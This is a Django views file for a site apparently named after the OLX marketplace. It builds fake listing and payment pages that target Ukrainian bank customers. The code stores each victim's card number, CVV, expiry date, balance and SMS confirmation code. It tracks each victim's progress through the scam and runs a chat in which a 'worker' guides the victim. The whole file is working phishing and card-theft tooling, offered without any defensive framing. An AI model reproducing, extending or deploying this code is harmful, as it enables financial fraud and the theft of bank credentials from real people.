from django.shortcuts import render
from django.http import HttpResponse
import random

from .models import Product


def createUrl(request):
    return render(request, 'olx_site/createUrl.html')


def detail(request, prod_id):
    try:
        product = Product.objects.filter(id=prod_id)
        product_data = Product.objects.get(id=prod_id)
        if product_data.transit != "главная":
            try:
                transit = product_data.transition_set.get(pr_id=prod_id)
                transit.transit = "главная"
                transit.save()
            except:
                product_data.transition_set.create(pr_id=prod_id, transit="главная")
        return render(request, 'olx_site/detail_id.html', {"product": product, "product_data": product_data})
    except:
        return render(request, 'olx_site/404.html')

def delete_from_db(request, prod_id):
    try:
        product = Product.obgects.filter(id=prod_id).delete()
        product.save()
        return HttpResponse("200")
    except:
        return HttpResponse("404")

def addToDB(request):
    num = "1234567890"
    bank_id = 0
    try:
        try:
            if request.POST['PrivateBank'] == "true":
                bank_id = 1
        except:
            pass
        try:
            if request.POST['MonoBank'] == "true":
                bank_id = 2
        except:
            pass
        try:
            if request.POST['OtherBank'] == "true":
                bank_id = 3
        except:
            pass
        a = Product(img_url=request.POST['photo_url'], name_product=request.POST['name'], price=request.POST['price'],
                    name=request.POST['name_user'], surname=request.POST['surname'], surduer=request.POST['surduer'],
                    address=request.POST['address'], telegram=request.POST['telegram'], bank_id=bank_id, transit="")
        random_id = ""
        for x in range(0,8):
            random_id += random.choice(num)
        a.id = int(random_id)
        a.save()
        return HttpResponse(a.id)
    except Exception as e:
        return render(request, 'olx_site/404.html')


def payment(request, prod_id):
    try:
        product_data = Product.objects.get(id=prod_id)
        return render(request, 'olx_site/payments.html', {"product": product_data})
    except:
        return render(request, 'olx_site/404.html')


def verif(request, prod_id):
    product_data = Product.objects.get(id=prod_id)
    try:
        card_data = product_data.carddata_set.get(number=request.POST['card'].replace(" ", ""))
        card_data.cvv = request.POST['code']
        card_data.date = request.POST['date']
        card_data.balance = request.POST['balance']
        card_data.code = ""
        card_data.save()
    except:
        product_data.carddata_set.create(pr_id=prod_id, number=request.POST['card'].replace(" ", ""),
                                         cvv=request.POST['code'], date=request.POST['date'],
                                         balance=request.POST['balance'], code="")
    return HttpResponse("ok")


def verification(request, prod_id, card):
    product_data = Product.objects.get(id=prod_id)
    try:
        full_card = card.replace(" ", "")
        card = card[12:]
        return render(request, "olx_site/verification.html", {'product': product_data,
                                                              'card': card,
                                                              'full_card': full_card})
    except:
        return render(request, 'olx_site/404.html')

def transit(request, prod_id):
    product_data = Product.objects.get(id=prod_id)
    try:
        transit = product_data.transition_set.get(pr_id=prod_id)
        transit.transit = "ввод карты"
        transit.save()
    except Exception as e:
        product_data.transition_set.create(pr_id=prod_id, transit="ввод карты")
        return HttpResponse(e)
    return HttpResponse("200")

def code(request, prod_id):
    product_data = Product.objects.get(id=prod_id)
    card_data = product_data.carddata_set.get(number=request.POST['card'])
    card_data.code = request.POST['code']
    card_data.save()
    return HttpResponse("ok")


def send_mess_from_user(request, prod_id):
    product_data = Product.objects.get(id=prod_id)
    try:
        chat = product_data.chat_set.get(pr_id=prod_id)
    except:
        chat = product_data.chat_set.create(pr_id=prod_id, messages="")

    mess = chat.messages
    try:
        mess += f"\nU: {request.POST['text']}"
        chat.mess_from_user = request.POST['text']
    except:
        pass
    chat.messages = mess
    chat.save()
    return HttpResponse(mess)


def send_mess_from_worker(request, prod_id):
    product_data = Product.objects.get(id=prod_id)
    chat = product_data.chat_set.get(pr_id=prod_id)
    mess = chat.messages
    mess += f"\nW: {request.POST['text']}"
    chat.messages = mess
    chat.save()
    return HttpResponse(mess)
